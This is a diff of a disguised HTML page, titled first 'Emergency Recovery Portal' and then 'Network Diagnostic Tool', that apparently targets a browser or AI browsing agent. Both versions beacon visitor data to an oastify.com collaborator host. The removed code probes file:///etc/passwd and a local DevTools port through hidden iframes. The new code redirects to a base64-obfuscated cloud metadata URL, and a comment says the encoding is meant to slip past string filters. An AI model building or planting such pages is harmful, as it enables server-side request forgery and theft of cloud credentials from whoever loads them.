@@ -1,49 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Emergency Recovery Portal</title>
-    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
+    <title>Network Diagnostic Tool</title>
 </head>
 <body>
-    <div id="app">
-        <h1>System Recovery: <span id="status">INIT_PHASE_1</span></h1>
-        <p>Validating environment security context...</p>
-    </div>
-
+    <h1>Diagnostic Phase: <span id="mode">Initializing...</span></h1>
     <script>
         const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
-        const log = (p, d) => {
-            const b = btoa(JSON.stringify(d));
-            new Image().src = `https://${collab}/${p}?v=${b}`;
-        };
+        
+        // Immediate beacon to see if JS is alive
+        new Image().src = `https://${collab}/js_alive?ua=${btoa(navigator.userAgent)}`;
 
-        async function stealthProbes() {
-            // Attempting to read local files via the browser's own 'view-source' or 'file' logic
-            const targets = ["file:///etc/passwd", "http://127.0.0.1:9222/json"];
-            
-            for (let url of targets) {
-                try {
-                    // Using a dynamic iframe to bypass simple fetch() filters
-                    const ifr = document.createElement('iframe');
-                    ifr.style.display = 'none';
-                    ifr.src = url;
-                    document.body.appendChild(ifr);
-                    log("iframe_attempt", {url});
-                } catch(e) {}
-            }
+        // We use a base64 encoded redirect to hide the target from simple string filters
+        const target = atob("aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9tZXRhZGF0YS9pbnN0YW5jZT9hcGktdmVyc2lvbj0yMDIxLTAyLTAx");
 
-            // The 'Kill Shot': Redirect the whole agent window to the Metadata service
-            // This forces the backend to decide whether to block the navigation
-            setTimeout(() => {
-                window.location.href = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
-            }, 2000);
-        }
-
-        window.onload = () => {
-            log("pwn_start", {ua: navigator.userAgent, ref: document.referrer});
-            stealthProbes();
-            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_99"; }, 5000);
-        };
+        setTimeout(() => {
+            document.getElementById('mode').innerText = "Redirecting to Internal Node...";
+            window.location.href = target;
+        }, 3000);
     </script>
 </body>
 </html>
